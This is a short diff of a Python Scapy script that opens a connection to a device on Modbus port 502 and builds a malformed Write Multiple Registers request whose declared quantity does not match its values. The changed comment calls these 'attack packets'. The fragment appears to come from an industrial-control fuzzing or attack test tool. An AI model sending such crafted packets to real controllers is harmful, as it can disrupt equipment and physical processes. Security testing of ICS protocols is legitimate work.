@@ -18,7 +18,8 @@ sock = socket.socket()
 sock.connect((args.dst_ip,502))
 stream = StreamSocket(sock)
 
-#Create various packets to send to the destination
+#Create various attack packets to send to the destination
+
 errorpacket=ModbusADURequest()/ModbusPDU10WriteMultipleRegistersRequest(startingAddr=1,outputsValue=[13],quantityRegisters=5L)
 
 #Send the desired packets
